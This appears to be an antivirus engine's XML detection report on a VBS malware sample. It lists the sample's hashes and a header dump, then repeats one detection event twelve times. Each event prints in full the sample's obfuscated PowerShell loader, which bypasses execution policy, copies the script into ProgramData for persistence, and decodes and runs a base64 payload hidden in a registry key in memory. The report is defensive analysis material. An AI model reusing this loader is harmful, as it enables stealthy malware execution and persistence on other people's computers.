@@ -1,0 +1,180 @@
+﻿<?xml version="1.0" encoding="UTF-8"?>
+<root>
+	<Summary>
+		<Result>10</Result>
+		<DetectName>VBS/Run.BC.200</DetectName>
+		<EngineName>libVBMacro.tks</EngineName>
+		<EngineVersion>1.4.5.57</EngineVersion>
+		<Severity>10</Severity>
+		<DetectName>VBS/Run.BC.200</DetectName>
+		<EngineName>libVBMacro.tks</EngineName>
+		<EngineVersion>1.4.5.57</EngineVersion>
+		<Severity>10</Severity>
+		<SampleName>1777336a2b446fbca3172d309884ee65e4e6c0655b3ce1a38301a9c6d61f7195.vbs</SampleName>
+		<SampleExt>VBS</SampleExt>
+	</Summary>
+	<Targets>
+		<TargetFile>
+			<1777336a2b446fbca3172d309884ee65e4e6c0655b3ce1a38301a9c6d61f7195.vbs>
+				<TargetID>1777336a2b446fbca3172d309884ee65e4e6c0655b3ce1a38301a9c6d61f7195.vbs_225507</TargetID>
+				<ParentID></ParentID>
+				<AbsolutePath>../2023-01-25/1777336a2b446fbca3172d309884ee65e4e6c0655b3ce1a38301a9c6d61f7195.vbs</AbsolutePath>
+				<FileName>1777336a2b446fbca3172d309884ee65e4e6c0655b3ce1a38301a9c6d61f7195.vbs</FileName>
+				<FileSIze></FileSIze>
+				<FileEXT>VBS</FileEXT>
+				<MD5>0761B39F32C1BB0F5B3004472B90B28C</MD5>
+				<SHA1>A5162DEF993676F7A0F0B75C721F23616DEBC3BC</SHA1>
+				<SHA256>1777336A2B446FBCA3172D309884EE65E4E6C0655B3CE1A38301A9C6D61F7195</SHA256>
+				<HAS160>5A3B9934FEF2BE4A5989F30676508BCF30FBDDB0</HAS160>
+				<FileHeaderDump>4F6E204572726F7220526573756D65204E6578740D0A4F6E204572726F7220526573756D65204E6578740D0A4F6E204572726F7220526573756D65204E6578740D0A466F722078203D203020546F2035</FileHeaderDump>
+				<IsExtractedFile>0</IsExtractedFile>
+			</1777336a2b446fbca3172d309884ee65e4e6c0655b3ce1a38301a9c6d61f7195.vbs>
+		</TargetFile>
+	</Targets>
+	<Detection>
+		<Event>
+			<EngineName>libVBMacro.tks</EngineName>
+			<EngineVersion>10</EngineVersion>
+			<TargetID>1777336a2b446fbca3172d309884ee65e4e6c0655b3ce1a38301a9c6d61f7195.vbs_225507</TargetID>
+			<PlatformID>Linux x64_profrog-ultra</PlatformID>
+			<Name>Run</Name>
+			<AnalysisCode>BC</AnalysisCode>
+			<EngineName>libVBMacro.tks</EngineName>
+			<Severity>10</Severity>
+			<Severity>10</Severity>
+			<Desc>(obj:Wscript.Shell).Run(&quot;powershell -noexit -exec bypass -window 1 -Command Copy-Item &apos;c:/users/Admin/desktop/sample.vbs&apos; &apos;c:\ProgramData\\Jesus.vbs&apos;;  $dishabituating = ((Get-ItemProperty HKCU:\Software\Chrome\).Updates);  $dishabituating = -join $dishabituating[-1..-$dishabituating.Length];[&lt;##&gt;AppDomain&lt;##&gt;]::&lt;##&gt;(&apos;coriariaceousurrentDomain&apos;.replace(&apos;coriariaceous&apos;,&apos;C&apos;))&lt;##&gt;.&lt;##&gt;(&apos;solemnessoad&apos;.replace(&apos;solemness&apos;,&apos;L&apos;))([Convert]::FromBase64String($dishabituating))&lt;##&gt;.&lt;##&gt;(&apos;lukewarmthntryPoint&apos;.replace(&apos;lukewarmth&apos;,&apos;E&apos;))&lt;##&gt;.&lt;##&gt;(&apos;InNicolsonoke&apos;.replace(&apos;Nicolson&apos;,&apos;v&apos;))($Null,$Null)&lt;##&gt;;&quot;, 0, FALSE)</Desc>
+		</Event>
+		<Event>
+			<EngineName>libVBMacro.tks</EngineName>
+			<EngineVersion>10</EngineVersion>
+			<TargetID>1777336a2b446fbca3172d309884ee65e4e6c0655b3ce1a38301a9c6d61f7195.vbs_225507</TargetID>
+			<PlatformID>Linux x64_profrog-ultra</PlatformID>
+			<Name>Run</Name>
+			<AnalysisCode>BC</AnalysisCode>
+			<EngineName>libVBMacro.tks</EngineName>
+			<Severity>10</Severity>
+			<Severity>10</Severity>
+			<Desc>(obj:Wscript.Shell).Run(&quot;powershell -noexit -exec bypass -window 1 -Command Copy-Item &apos;c:/users/Admin/desktop/sample.vbs&apos; &apos;c:\ProgramData\\Jesus.vbs&apos;;  $dishabituating = ((Get-ItemProperty HKCU:\Software\Chrome\).Updates);  $dishabituating = -join $dishabituating[-1..-$dishabituating.Length];[&lt;##&gt;AppDomain&lt;##&gt;]::&lt;##&gt;(&apos;coriariaceousurrentDomain&apos;.replace(&apos;coriariaceous&apos;,&apos;C&apos;))&lt;##&gt;.&lt;##&gt;(&apos;solemnessoad&apos;.replace(&apos;solemness&apos;,&apos;L&apos;))([Convert]::FromBase64String($dishabituating))&lt;##&gt;.&lt;##&gt;(&apos;lukewarmthntryPoint&apos;.replace(&apos;lukewarmth&apos;,&apos;E&apos;))&lt;##&gt;.&lt;##&gt;(&apos;InNicolsonoke&apos;.replace(&apos;Nicolson&apos;,&apos;v&apos;))($Null,$Null)&lt;##&gt;;&quot;, 0, FALSE)</Desc>
+		</Event>
+		<Event>
+			<EngineName>libVBMacro.tks</EngineName>
+			<EngineVersion>10</EngineVersion>
+			<TargetID>1777336a2b446fbca3172d309884ee65e4e6c0655b3ce1a38301a9c6d61f7195.vbs_225507</TargetID>
+			<PlatformID>Linux x64_profrog-ultra</PlatformID>
+			<Name>Run</Name>
+			<AnalysisCode>BC</AnalysisCode>
+			<EngineName>libVBMacro.tks</EngineName>
+			<Severity>10</Severity>
+			<Severity>10</Severity>
+			<Desc>(obj:Wscript.Shell).Run(&quot;powershell -noexit -exec bypass -window 1 -Command Copy-Item &apos;c:/users/Admin/desktop/sample.vbs&apos; &apos;c:\ProgramData\\Jesus.vbs&apos;;  $dishabituating = ((Get-ItemProperty HKCU:\Software\Chrome\).Updates);  $dishabituating = -join $dishabituating[-1..-$dishabituating.Length];[&lt;##&gt;AppDomain&lt;##&gt;]::&lt;##&gt;(&apos;coriariaceousurrentDomain&apos;.replace(&apos;coriariaceous&apos;,&apos;C&apos;))&lt;##&gt;.&lt;##&gt;(&apos;solemnessoad&apos;.replace(&apos;solemness&apos;,&apos;L&apos;))([Convert]::FromBase64String($dishabituating))&lt;##&gt;.&lt;##&gt;(&apos;lukewarmthntryPoint&apos;.replace(&apos;lukewarmth&apos;,&apos;E&apos;))&lt;##&gt;.&lt;##&gt;(&apos;InNicolsonoke&apos;.replace(&apos;Nicolson&apos;,&apos;v&apos;))($Null,$Null)&lt;##&gt;;&quot;, 0, FALSE)</Desc>
+		</Event>
+		<Event>
+			<EngineName>libVBMacro.tks</EngineName>
+			<EngineVersion>10</EngineVersion>
+			<TargetID>1777336a2b446fbca3172d309884ee65e4e6c0655b3ce1a38301a9c6d61f7195.vbs_225507</TargetID>
+			<PlatformID>Linux x64_profrog-ultra</PlatformID>
+			<Name>Run</Name>
+			<AnalysisCode>BC</AnalysisCode>
+			<EngineName>libVBMacro.tks</EngineName>
+			<Severity>10</Severity>
+			<Severity>10</Severity>
+			<Desc>(obj:Wscript.Shell).Run(&quot;powershell -noexit -exec bypass -window 1 -Command Copy-Item &apos;c:/users/Admin/desktop/sample.vbs&apos; &apos;c:\ProgramData\\Jesus.vbs&apos;;  $dishabituating = ((Get-ItemProperty HKCU:\Software\Chrome\).Updates);  $dishabituating = -join $dishabituating[-1..-$dishabituating.Length];[&lt;##&gt;AppDomain&lt;##&gt;]::&lt;##&gt;(&apos;coriariaceousurrentDomain&apos;.replace(&apos;coriariaceous&apos;,&apos;C&apos;))&lt;##&gt;.&lt;##&gt;(&apos;solemnessoad&apos;.replace(&apos;solemness&apos;,&apos;L&apos;))([Convert]::FromBase64String($dishabituating))&lt;##&gt;.&lt;##&gt;(&apos;lukewarmthntryPoint&apos;.replace(&apos;lukewarmth&apos;,&apos;E&apos;))&lt;##&gt;.&lt;##&gt;(&apos;InNicolsonoke&apos;.replace(&apos;Nicolson&apos;,&apos;v&apos;))($Null,$Null)&lt;##&gt;;&quot;, 0, FALSE)</Desc>
+		</Event>
+		<Event>
+			<EngineName>libVBMacro.tks</EngineName>
+			<EngineVersion>10</EngineVersion>
+			<TargetID>1777336a2b446fbca3172d309884ee65e4e6c0655b3ce1a38301a9c6d61f7195.vbs_225507</TargetID>
+			<PlatformID>Linux x64_profrog-ultra</PlatformID>
+			<Name>Run</Name>
+			<AnalysisCode>BC</AnalysisCode>
+			<EngineName>libVBMacro.tks</EngineName>
+			<Severity>10</Severity>
+			<Severity>10</Severity>
+			<Desc>(obj:Wscript.Shell).Run(&quot;powershell -noexit -exec bypass -window 1 -Command Copy-Item &apos;c:/users/Admin/desktop/sample.vbs&apos; &apos;c:\ProgramData\\Jesus.vbs&apos;;  $dishabituating = ((Get-ItemProperty HKCU:\Software\Chrome\).Updates);  $dishabituating = -join $dishabituating[-1..-$dishabituating.Length];[&lt;##&gt;AppDomain&lt;##&gt;]::&lt;##&gt;(&apos;coriariaceousurrentDomain&apos;.replace(&apos;coriariaceous&apos;,&apos;C&apos;))&lt;##&gt;.&lt;##&gt;(&apos;solemnessoad&apos;.replace(&apos;solemness&apos;,&apos;L&apos;))([Convert]::FromBase64String($dishabituating))&lt;##&gt;.&lt;##&gt;(&apos;lukewarmthntryPoint&apos;.replace(&apos;lukewarmth&apos;,&apos;E&apos;))&lt;##&gt;.&lt;##&gt;(&apos;InNicolsonoke&apos;.replace(&apos;Nicolson&apos;,&apos;v&apos;))($Null,$Null)&lt;##&gt;;&quot;, 0, FALSE)</Desc>
+		</Event>
+		<Event>
+			<EngineName>libVBMacro.tks</EngineName>
+			<EngineVersion>10</EngineVersion>
+			<TargetID>1777336a2b446fbca3172d309884ee65e4e6c0655b3ce1a38301a9c6d61f7195.vbs_225507</TargetID>
+			<PlatformID>Linux x64_profrog-ultra</PlatformID>
+			<Name>Run</Name>
+			<AnalysisCode>BC</AnalysisCode>
+			<EngineName>libVBMacro.tks</EngineName>
+			<Severity>10</Severity>
+			<Severity>10</Severity>
+			<Desc>(obj:Wscript.Shell).Run(&quot;powershell -noexit -exec bypass -window 1 -Command Copy-Item &apos;c:/users/Admin/desktop/sample.vbs&apos; &apos;c:\ProgramData\\Jesus.vbs&apos;;  $dishabituating = ((Get-ItemProperty HKCU:\Software\Chrome\).Updates);  $dishabituating = -join $dishabituating[-1..-$dishabituating.Length];[&lt;##&gt;AppDomain&lt;##&gt;]::&lt;##&gt;(&apos;coriariaceousurrentDomain&apos;.replace(&apos;coriariaceous&apos;,&apos;C&apos;))&lt;##&gt;.&lt;##&gt;(&apos;solemnessoad&apos;.replace(&apos;solemness&apos;,&apos;L&apos;))([Convert]::FromBase64String($dishabituating))&lt;##&gt;.&lt;##&gt;(&apos;lukewarmthntryPoint&apos;.replace(&apos;lukewarmth&apos;,&apos;E&apos;))&lt;##&gt;.&lt;##&gt;(&apos;InNicolsonoke&apos;.replace(&apos;Nicolson&apos;,&apos;v&apos;))($Null,$Null)&lt;##&gt;;&quot;, 0, FALSE)</Desc>
+		</Event>
+		<Event>
+			<EngineName>libVBMacro.tks</EngineName>
+			<EngineVersion>10</EngineVersion>
+			<TargetID>1777336a2b446fbca3172d309884ee65e4e6c0655b3ce1a38301a9c6d61f7195.vbs_225507</TargetID>
+			<PlatformID>Linux x64_profrog-ultra</PlatformID>
+			<Name>Run</Name>
+			<AnalysisCode>BC</AnalysisCode>
+			<EngineName>libVBMacro.tks</EngineName>
+			<Severity>10</Severity>
+			<Severity>10</Severity>
+			<Desc>(obj:Wscript.Shell).Run(&quot;powershell -noexit -exec bypass -window 1 -Command Copy-Item &apos;c:/users/Admin/desktop/sample.vbs&apos; &apos;c:\ProgramData\\Jesus.vbs&apos;;  $dishabituating = ((Get-ItemProperty HKCU:\Software\Chrome\).Updates);  $dishabituating = -join $dishabituating[-1..-$dishabituating.Length];[&lt;##&gt;AppDomain&lt;##&gt;]::&lt;##&gt;(&apos;coriariaceousurrentDomain&apos;.replace(&apos;coriariaceous&apos;,&apos;C&apos;))&lt;##&gt;.&lt;##&gt;(&apos;solemnessoad&apos;.replace(&apos;solemness&apos;,&apos;L&apos;))([Convert]::FromBase64String($dishabituating))&lt;##&gt;.&lt;##&gt;(&apos;lukewarmthntryPoint&apos;.replace(&apos;lukewarmth&apos;,&apos;E&apos;))&lt;##&gt;.&lt;##&gt;(&apos;InNicolsonoke&apos;.replace(&apos;Nicolson&apos;,&apos;v&apos;))($Null,$Null)&lt;##&gt;;&quot;, 0, FALSE)</Desc>
+		</Event>
+		<Event>
+			<EngineName>libVBMacro.tks</EngineName>
+			<EngineVersion>10</EngineVersion>
+			<TargetID>1777336a2b446fbca3172d309884ee65e4e6c0655b3ce1a38301a9c6d61f7195.vbs_225507</TargetID>
+			<PlatformID>Linux x64_profrog-ultra</PlatformID>
+			<Name>Run</Name>
+			<AnalysisCode>BC</AnalysisCode>
+			<EngineName>libVBMacro.tks</EngineName>
+			<Severity>10</Severity>
+			<Severity>10</Severity>
+			<Desc>(obj:Wscript.Shell).Run(&quot;powershell -noexit -exec bypass -window 1 -Command Copy-Item &apos;c:/users/Admin/desktop/sample.vbs&apos; &apos;c:\ProgramData\\Jesus.vbs&apos;;  $dishabituating = ((Get-ItemProperty HKCU:\Software\Chrome\).Updates);  $dishabituating = -join $dishabituating[-1..-$dishabituating.Length];[&lt;##&gt;AppDomain&lt;##&gt;]::&lt;##&gt;(&apos;coriariaceousurrentDomain&apos;.replace(&apos;coriariaceous&apos;,&apos;C&apos;))&lt;##&gt;.&lt;##&gt;(&apos;solemnessoad&apos;.replace(&apos;solemness&apos;,&apos;L&apos;))([Convert]::FromBase64String($dishabituating))&lt;##&gt;.&lt;##&gt;(&apos;lukewarmthntryPoint&apos;.replace(&apos;lukewarmth&apos;,&apos;E&apos;))&lt;##&gt;.&lt;##&gt;(&apos;InNicolsonoke&apos;.replace(&apos;Nicolson&apos;,&apos;v&apos;))($Null,$Null)&lt;##&gt;;&quot;, 0, FALSE)</Desc>
+		</Event>
+		<Event>
+			<EngineName>libVBMacro.tks</EngineName>
+			<EngineVersion>10</EngineVersion>
+			<TargetID>1777336a2b446fbca3172d309884ee65e4e6c0655b3ce1a38301a9c6d61f7195.vbs_225507</TargetID>
+			<PlatformID>Linux x64_profrog-ultra</PlatformID>
+			<Name>Run</Name>
+			<AnalysisCode>BC</AnalysisCode>
+			<EngineName>libVBMacro.tks</EngineName>
+			<Severity>10</Severity>
+			<Severity>10</Severity>
+			<Desc>(obj:Wscript.Shell).Run(&quot;powershell -noexit -exec bypass -window 1 -Command Copy-Item &apos;c:/users/Admin/desktop/sample.vbs&apos; &apos;c:\ProgramData\\Jesus.vbs&apos;;  $dishabituating = ((Get-ItemProperty HKCU:\Software\Chrome\).Updates);  $dishabituating = -join $dishabituating[-1..-$dishabituating.Length];[&lt;##&gt;AppDomain&lt;##&gt;]::&lt;##&gt;(&apos;coriariaceousurrentDomain&apos;.replace(&apos;coriariaceous&apos;,&apos;C&apos;))&lt;##&gt;.&lt;##&gt;(&apos;solemnessoad&apos;.replace(&apos;solemness&apos;,&apos;L&apos;))([Convert]::FromBase64String($dishabituating))&lt;##&gt;.&lt;##&gt;(&apos;lukewarmthntryPoint&apos;.replace(&apos;lukewarmth&apos;,&apos;E&apos;))&lt;##&gt;.&lt;##&gt;(&apos;InNicolsonoke&apos;.replace(&apos;Nicolson&apos;,&apos;v&apos;))($Null,$Null)&lt;##&gt;;&quot;, 0, FALSE)</Desc>
+		</Event>
+		<Event>
+			<EngineName>libVBMacro.tks</EngineName>
+			<EngineVersion>10</EngineVersion>
+			<TargetID>1777336a2b446fbca3172d309884ee65e4e6c0655b3ce1a38301a9c6d61f7195.vbs_225507</TargetID>
+			<PlatformID>Linux x64_profrog-ultra</PlatformID>
+			<Name>Run</Name>
+			<AnalysisCode>BC</AnalysisCode>
+			<EngineName>libVBMacro.tks</EngineName>
+			<Severity>10</Severity>
+			<Severity>10</Severity>
+			<Desc>(obj:Wscript.Shell).Run(&quot;powershell -noexit -exec bypass -window 1 -Command Copy-Item &apos;c:/users/Admin/desktop/sample.vbs&apos; &apos;c:\ProgramData\\Jesus.vbs&apos;;  $dishabituating = ((Get-ItemProperty HKCU:\Software\Chrome\).Updates);  $dishabituating = -join $dishabituating[-1..-$dishabituating.Length];[&lt;##&gt;AppDomain&lt;##&gt;]::&lt;##&gt;(&apos;coriariaceousurrentDomain&apos;.replace(&apos;coriariaceous&apos;,&apos;C&apos;))&lt;##&gt;.&lt;##&gt;(&apos;solemnessoad&apos;.replace(&apos;solemness&apos;,&apos;L&apos;))([Convert]::FromBase64String($dishabituating))&lt;##&gt;.&lt;##&gt;(&apos;lukewarmthntryPoint&apos;.replace(&apos;lukewarmth&apos;,&apos;E&apos;))&lt;##&gt;.&lt;##&gt;(&apos;InNicolsonoke&apos;.replace(&apos;Nicolson&apos;,&apos;v&apos;))($Null,$Null)&lt;##&gt;;&quot;, 0, FALSE)</Desc>
+		</Event>
+		<Event>
+			<EngineName>libVBMacro.tks</EngineName>
+			<EngineVersion>10</EngineVersion>
+			<TargetID>1777336a2b446fbca3172d309884ee65e4e6c0655b3ce1a38301a9c6d61f7195.vbs_225507</TargetID>
+			<PlatformID>Linux x64_profrog-ultra</PlatformID>
+			<Name>Run</Name>
+			<AnalysisCode>BC</AnalysisCode>
+			<EngineName>libVBMacro.tks</EngineName>
+			<Severity>10</Severity>
+			<Severity>10</Severity>
+			<Desc>(obj:Wscript.Shell).Run(&quot;powershell -noexit -exec bypass -window 1 -Command Copy-Item &apos;c:/users/Admin/desktop/sample.vbs&apos; &apos;c:\ProgramData\\Jesus.vbs&apos;;  $dishabituating = ((Get-ItemProperty HKCU:\Software\Chrome\).Updates);  $dishabituating = -join $dishabituating[-1..-$dishabituating.Length];[&lt;##&gt;AppDomain&lt;##&gt;]::&lt;##&gt;(&apos;coriariaceousurrentDomain&apos;.replace(&apos;coriariaceous&apos;,&apos;C&apos;))&lt;##&gt;.&lt;##&gt;(&apos;solemnessoad&apos;.replace(&apos;solemness&apos;,&apos;L&apos;))([Convert]::FromBase64String($dishabituating))&lt;##&gt;.&lt;##&gt;(&apos;lukewarmthntryPoint&apos;.replace(&apos;lukewarmth&apos;,&apos;E&apos;))&lt;##&gt;.&lt;##&gt;(&apos;InNicolsonoke&apos;.replace(&apos;Nicolson&apos;,&apos;v&apos;))($Null,$Null)&lt;##&gt;;&quot;, 0, FALSE)</Desc>
+		</Event>
+		<Event>
+			<EngineName>libVBMacro.tks</EngineName>
+			<EngineVersion>10</EngineVersion>
+			<TargetID>1777336a2b446fbca3172d309884ee65e4e6c0655b3ce1a38301a9c6d61f7195.vbs_225507</TargetID>
+			<PlatformID>Linux x64_profrog-ultra</PlatformID>
+			<Name>Run</Name>
+			<AnalysisCode>BC</AnalysisCode>
+			<EngineName>libVBMacro.tks</EngineName>
+			<Severity>10</Severity>
+			<Severity>10</Severity>
+			<Desc>(obj:Wscript.Shell).Run(&quot;powershell -noexit -exec bypass -window 1 -Command Copy-Item &apos;c:/users/Admin/desktop/sample.vbs&apos; &apos;c:\ProgramData\\Jesus.vbs&apos;;  $dishabituating = ((Get-ItemProperty HKCU:\Software\Chrome\).Updates);  $dishabituating = -join $dishabituating[-1..-$dishabituating.Length];[&lt;##&gt;AppDomain&lt;##&gt;]::&lt;##&gt;(&apos;coriariaceousurrentDomain&apos;.replace(&apos;coriariaceous&apos;,&apos;C&apos;))&lt;##&gt;.&lt;##&gt;(&apos;solemnessoad&apos;.replace(&apos;solemness&apos;,&apos;L&apos;))([Convert]::FromBase64String($dishabituating))&lt;##&gt;.&lt;##&gt;(&apos;lukewarmthntryPoint&apos;.replace(&apos;lukewarmth&apos;,&apos;E&apos;))&lt;##&gt;.&lt;##&gt;(&apos;InNicolsonoke&apos;.replace(&apos;Nicolson&apos;,&apos;v&apos;))($Null,$Null)&lt;##&gt;;&quot;, 0, FALSE)</Desc>
+		</Event>
+	</Detection>
+</root>
